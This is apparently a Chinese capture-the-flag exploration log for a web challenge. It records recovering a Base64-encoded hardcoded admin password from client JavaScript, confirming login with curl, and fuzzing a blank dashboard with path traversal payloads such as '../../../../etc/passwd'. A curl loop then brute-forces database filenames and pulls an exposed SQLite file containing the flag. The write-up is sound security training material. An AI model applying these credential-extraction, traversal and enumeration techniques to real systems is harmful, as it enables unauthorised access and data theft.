# a-17 · 探索记录

对应题解：[`a-17.md`](./a-17.md)。

## 目标与起点

题目说「系统诊断面板，没有验证码，开发可能把超管口令硬编码在某处，进去后用日志查询找数据库里的 flag」。中等难度，300 分。

启动后是登录页（Apache + PHP 7.4.33），页面只有 `css/style.css` 和 `js/login.js`。

## 第一阶段：前端源码

登录页有一个「开发者帮助」链接：

```html
<p>遇到问题？ <a href="#" id="devHelpLinks">开发者帮助</a></p>
```

顺着它读 `js/login.js`，第一屏就是答案：

```js
// Developer autofill function for testing purposes
// TODO: Remove this before production deployment!
// Default testing credentials:
// u: admin
devHelpLink.addEventListener('click', function (e) {
    if (confirm("Auto-fill testing credentials? (Dev Only)")) {
        uInput.value = 'admin';
        pInput.value = atob('QURNSU4xMkAxMjMh');   // ADMIN12@123!
    }
});
```

Base64 解码即得 `ADMIN12@123!`。这一步没有任何障碍，是本题唯一「白送」的部分。

## 第二阶段：登录与「登录成功」判据

```bash
# 正确口令
curl -c cj -D- -o /dev/null -X POST \
  --data-urlencode 'username=admin' --data-urlencode 'password=ADMIN12@123!' \
  http://$T/index.php
# 302 → dashboard.php

# 错误口令
curl -D- -o /dev/null -X POST -d 'username=admin&password=wrong' http://$T/index.php
# 200，body 1541 字节（登录页）
```

判据很干净：**302 = 成功，200 + 登录页 = 失败**。而且只有 `admin` 这个用户名能成功，其它用户名（`administrator`/`root`/`sysadmin`/`it`/`dev` …）全部 200。

## 第三阶段：dashboard 是空的（长时间卡住）

登录后 `/dashboard.php`：

```
HTTP/1.1 200 OK
Content-Length: 0
```

不管是带会话还是不带来，都是 200 + 0 字节。于是开始排查：

| 尝试 | 结果 |
| --- | --- |
| `?page=logs` / `?module=logs` / `?view=logs` / `?action=logs` / `?tab=logs` | 全部 0 字节 |
| `?q=` / `?query=` / `?keyword=` / `?log=` … 40 个参数名 | 全部 0 字节 |
| POST 表单（`action=logs&query=1`） | 0 字节 |
| POST JSON（`{"query":"1"}`、`{"action":"logs"}`） | 0 字节 |
| 路径穿越参数（`../../../../etc/passwd`、`php://filter`） | 0 字节 |
| `dashboard.php` 大小写变体、末尾斜杠 | 404 或 0 字节 |

同时确认了：

- `css/style.css` 里有 `.dashboard-wrapper`、`.content-area`、`.kpi-cards` 这些类，说明作者**写过**一个 dashboard 页面。
- `includes/footer.php` 可以直接访问，返回 231 字节的页脚 HTML —— 说明 `includes/` 目录和 PHP 解析都正常。
- `/db/` 和 `/includes/` 都是 403（目录索引禁止）。

**结论**：`dashboard.php` 在实际部署里执行到一半就退出了（很可能是会话键名不匹配或 include 失败），题目里说的「日志查询功能」没有真的渲染出来。这一支继续调参数已无收益。

## 第四阶段：转向文件系统

因为 `/db/` 目录存在（403 而不是 404），按「数据文件放错位置」的思路直接猜文件名：

```bash
for f in sysdiag diag logs data app main site system panel admin db database mysql; do
  for e in db sqlite sqlite3 db3 sql; do
    curl -s -o /dev/null -w "$f.$e %{http_code} %{size_download}\n" "http://$T/db/$f.$e"
  done
done
```

命中：

```
db/sysdiag.db -> 200 16384
```

下载并读表：

```bash
sqlite3 sysdiag.db '.tables'
# config  system_logs

sqlite3 sysdiag.db 'select * from config;'
# 1|system_flag|flag{05d2ef49-8a38-43c3-a674-257396769739}
```

`system_logs` 里还有 5 条干扰日志，其中 `ERROR Failed to connect to backend authentication service!` 反过来印证了 dashboard 为什么空白。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 暴力猜口令 | 不需要 | JS 里 `atob` 直接给 |
| 其它用户名 + 同一口令 | 失败 | 只有 `admin` 返回 302 |
| `dashboard.php` 各种 query 参数（40 个） | 全 0 字节 | 页面在渲染前就退出 |
| `dashboard.php` POST / JSON | 全 0 字节 | 同上 |
| `dashboard.php` LFI 参数 | 全 0 字节 | 没有 include 到用户输入 |
| `/db/` 目录列表 | 403 | 目录索引禁止 |
| `/db/*.sql`、`/db/*.sqlite3` | 404 | 文件名不对 |
| **`/db/sysdiag.db`** | **200 / 16384** | SQLite，`config.system_flag` 就是 flag |
| `/includes/*.php` 常见名 | 404，只有 `footer.php` | 头文件命名不同或被删 |

## 这次真正的收获

1. **`atob` 是编码不是加密。** 前端里凡是出现 `atob(`/`btoa(`，先解一遍再看逻辑。
2. **状态码比页面文字更适合判断登录成功。** 302/200 的差别比「欢迎 xxx」可靠，尤其在页面渲染有问题时。
3. **页面空白不等于题目结束。** 这道题的 dashboard 确实渲染不出来，但 `/db/sysdiag.db` 才是真正的入口。**先做目录/文件枚举，再决定要不要修页面。**
4. **403 的目录里可能有 200 的文件。** 目录索引禁止只挡列表，不挡具体文件名；`db/` + 常见数据文件名是一个非常高效的组合。
5. **`.db`/`.sqlite` 不在常见的 Web 服务器拒绝列表里。** 只禁 `.sql` 的配置很常见，备份/数据文件放在 Web 根目录下就会直接可下载。
